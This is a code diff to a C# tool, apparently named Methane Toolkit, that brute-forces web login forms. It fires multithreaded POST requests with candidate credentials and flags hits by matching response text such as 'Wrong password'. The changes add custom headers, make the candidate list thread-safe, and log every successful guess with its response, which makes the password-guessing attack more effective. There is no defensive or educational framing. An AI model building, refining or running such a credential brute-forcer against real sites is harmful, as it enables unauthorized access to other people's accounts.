@@ -25,7 +25,9 @@ namespace Methane.Toolkit
         IEnumerator<string> bodyPipeline;
 
         public bool HasCookie = false;
+        public bool HasHeaders = false;
         public string Cookie;
+        public string Headers;
 
         public void PromptParamenters()
         {
@@ -43,7 +45,7 @@ namespace Methane.Toolkit
             ChooseCookies:
             Cookie = Prompt("Enter cookies to use OR Enter ~filename to read cookies OR [Enter] not to use cookies");
 
-            HasCookie = Cookie != "";
+            HasCookie = Cookie.Length != 0;
             if (Cookie.StartsWith('~'))
             {
                 if (Cookie == "~") Cookie = "~cookie.txt";
@@ -58,13 +60,31 @@ namespace Methane.Toolkit
                 }
             }
 
+            ChooseHeaders:
+            Headers = Prompt("Enter Headers to use OR Enter ~filename to read Headers OR [Enter] not to use Headers");
+
+            HasHeaders = Headers.Length != 0;
+            if (Headers.StartsWith('~'))
+            {
+                if (Headers == "~") Headers = "~headers.txt";
+                try
+                {
+                    Headers = File.ReadAllText(Headers.TrimStart('~'));
+                }
+                catch (Exception ex)
+                {
+                    LogError(ex);
+                    goto ChooseHeaders;
+                }
+            }
+
 
             findWith = Prompt("In a positive response, what text we would find? (Ex :- Wellcome) [or null]");
-            hasFindWith = findWith != "";
+            hasFindWith = findWith.Length != 0;
             findWithout = Prompt("In a positive response, what text we won't find? (Ex :- Wrong password) [or null]");
-            hasFindWithout = findWithout != "";
+            hasFindWithout = findWithout.Length != 0;
 
-            Prompt("Please use the following tool to create POST body data string list");
+            Log("Please use the following tool to create POST body data string list");
             csa = new CSA();
             csa.PromptParamenters();
 
@@ -89,7 +109,7 @@ namespace Methane.Toolkit
 
             for (int n = 0; n < AllowedThrds; n++)
             {
-                new System.Threading.Thread(new System.Threading.ParameterizedThreadStart(ThrLoop)) { Name = $"POST Thrd {n}" }.Start(null);
+                new System.Threading.Thread(new System.Threading.ThreadStart(ThrLoop)) { Name = $"POST Thrd {n}" }.Start();
                 System.Threading.Thread.Sleep(10);
             }
 
@@ -113,8 +133,8 @@ namespace Methane.Toolkit
 
 
 
-
-        private void ThrLoop(object o)
+        int Report = 0;
+        private void ThrLoop()
         {
 
             runningThrds++;
@@ -125,39 +145,52 @@ namespace Methane.Toolkit
 
             if (found) { runningThrds--; return; }
 
-            if (bodyPipeline.MoveNext())
+            string poststring;
+            lock (bodyPipeline)
             {
-                string poststring = bodyPipeline.Current;
-
-                try
+                if (bodyPipeline.MoveNext())
                 {
-
-                    string resp = PostForm(url, poststring);
-
-                    if ((hasFindWith && resp.Contains(findWith)) || (hasFindWithout && !resp.Contains(findWithout)))
-                    {
-                        Log($"We found it! '{poststring}' _______ :-) ________________________________");
-                        found = true;
-                        foundPass = poststring;
-
-                        runningThrds--; return;
-                    }
-                    else
-                    {
-                        Log($"{poststring} didn't work");
-                    }
-
+                    poststring = bodyPipeline.Current;
                 }
-                catch (Exception ex)
+                else
                 {
-                    Log($"!!! Error {ex.ToString()} - {ex.Message} @ {ex.StackTrace}");
+                    runningThrds--;
+                    return;
                 }
-
-                goto bodyPipelineMoveNext;
             }
 
 
-            runningThrds--;
+
+            try
+            {
+
+                string resp = PostForm(url, poststring, Cookie, Headers);
+
+                if ((hasFindWith && resp.Contains(findWith)) || (hasFindWithout && !resp.Contains(findWithout)))
+                {
+                    LogSpecial($"We found it! '{poststring}' _______ :-) ________________________________ \n Response : \n{resp} \n \n");
+                    //found = true;
+                    //foundPass = poststring;
+
+                    //runningThrds--; return;
+                }
+                else
+                {
+                    Log($"{poststring} didn't work");
+                    Report++;
+                    if (Report % 1000 == 0)
+                    {
+                        Log($"Reporting Invalid Respose {resp}");
+                    }
+                }
+
+            }
+            catch (Exception ex)
+            {
+                Log($"!!! Error {ex} - {ex.Message} @ {ex.StackTrace}");
+            }
+
+            goto bodyPipelineMoveNext;
 
         }
 
@@ -168,11 +201,11 @@ namespace Methane.Toolkit
             wr.Method = "POST";
             wr.ContentType = "application/x-www-form-urlencoded";
 
-            if (Cookie != "") wr.Headers.Add(HttpRequestHeader.Cookie, Cookie);
+            if (Cookie.Length != 0) wr.Headers.Add(HttpRequestHeader.Cookie, Cookie);
 
-            if (Headers != "")
-                foreach (string header in Headers.Split("/n"))
-                    wr.Headers.Add(Headers);
+            if (Headers.Length != 0)
+                foreach (string header in Headers.Split("\n"))
+                    wr.Headers.Add(header);
 
 
 
